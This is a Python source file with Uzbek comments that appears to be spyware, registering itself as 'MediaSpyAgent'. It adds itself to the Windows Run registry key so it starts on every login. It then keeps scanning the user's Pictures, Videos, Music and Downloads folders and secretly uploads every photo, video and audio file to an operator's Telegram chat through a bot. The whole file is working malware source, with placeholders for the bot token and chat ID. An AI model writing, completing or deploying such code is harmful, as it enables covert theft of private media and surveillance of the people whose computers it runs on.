import os
import sqlite3
import time
import telebot
import socket
import winreg as reg
from datetime import datetime

# === CONFIGURATION ===
BOT_TOKEN = 'BOT_TOKENINGIZNI_BU_YERGA_QOYING'
CHAT_ID = 'CHAT_IDINGIZNI_BU_YERGA_QOYING'  # Bu odatda son bo'ladi

FOLDERS_TO_SCAN = [
    os.path.expanduser("~/Pictures"),
    os.path.expanduser("~/Videos"),
    os.path.expanduser("~/Music"),
    os.path.expanduser("~/Downloads")
]

ALLOWED_EXTENSIONS = ['.jpg', '.jpeg', '.png', '.mp4', '.mp3']
CHECK_INTERVAL = 60  # soniyada
DB_FILE = "sent_files.db"

# === TELEGRAM SETUP ===
bot = telebot.TeleBot(BOT_TOKEN)

# === DATABASE SETUP ===
conn = sqlite3.connect(DB_FILE)
c = conn.cursor()
c.execute("CREATE TABLE IF NOT EXISTS sent_files (filepath TEXT PRIMARY KEY)")
conn.commit()

# === INTERNET CONNECTION CHECK ===
def is_connected():
    try:
        socket.create_connection(("1.1.1.1", 53), timeout=2)
        return True
    except:
        return False

# === AUTOSTART FUNCTION FOR WINDOWS ===
def add_to_startup():
    file_path = os.path.abspath(__file__)
    key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE)
    reg.SetValueEx(reg_key, "MediaSpyAgent", 0, reg.REG_SZ, file_path)
    reg.CloseKey(reg_key)

# === SEND FILE TO TELEGRAM ===
def send_file_to_telegram(filepath):
    ext = os.path.splitext(filepath)[1].lower()
    caption = ""
    try:
        creation_time = os.path.getctime(filepath)
        formatted_time = datetime.fromtimestamp(creation_time).strftime("%Y-%m-%d %H:%M:%S")
        caption = f"Fayl: {os.path.basename(filepath)}\nYaratilgan: {formatted_time}"
        with open(filepath, "rb") as f:
            if ext in ['.jpg', '.jpeg', '.png']:
                bot.send_photo(CHAT_ID, f, caption=caption)
            elif ext in ['.mp4']:
                bot.send_video(CHAT_ID, f, caption=caption)
            elif ext in ['.mp3']:
                bot.send_audio(CHAT_ID, f, caption=caption)
        print(f"[✓] Yuborildi: {filepath}")
        return True
    except Exception as e:
        print(f"[!] Yuborilmadi: {filepath}, Sababi: {e}")
        return False
# === MAIN FUNCTION ===
def main_loop():
    add_to_startup()
    print("[i] Dastur ishga tushdi. Internet kutilmoqda...")
    while not is_connected():
        time.sleep(5)
    print("[i] Internet ulandi. Fayllarni tekshirish boshlandi...")
    while True:
        for folder in FOLDERS_TO_SCAN:
            for root, dirs, files in os.walk(folder):
                for filename in files:
                    if any(filename.lower().endswith(ext) for ext in ALLOWED_EXTENSIONS):
                        filepath = os.path.join(root, filename)
                        c.execute("SELECT 1 FROM sent_files WHERE filepath = ?", (filepath,))
                        if not c.fetchone():
                            if send_file_to_telegram(filepath):
                                c.execute("INSERT INTO sent_files (filepath) VALUES (?)", (filepath,))
                                conn.commit()
        time.sleep(CHECK_INTERVAL)
if __name__ == "__main__":
    main_loop()
